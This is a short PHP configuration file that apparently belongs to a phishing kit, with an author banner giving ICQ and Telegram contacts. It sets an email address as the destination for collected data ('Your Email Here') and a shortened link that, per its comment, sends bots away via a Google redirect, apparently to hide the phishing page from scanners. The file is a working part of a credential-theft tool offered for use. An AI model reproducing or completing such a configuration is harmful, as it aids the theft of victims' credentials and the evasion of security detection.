<?php
/*       
// made by ANOXYTY" //Contact https://icq.im/Anoxyty / TELEGRAM @ANOXYTY "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
$data = "gbluck@yandex.com"; // Your Email Here :)
$Exit = "https://bit.ly/3eyiRxZ"; // Redirects bots via google redirect
?>

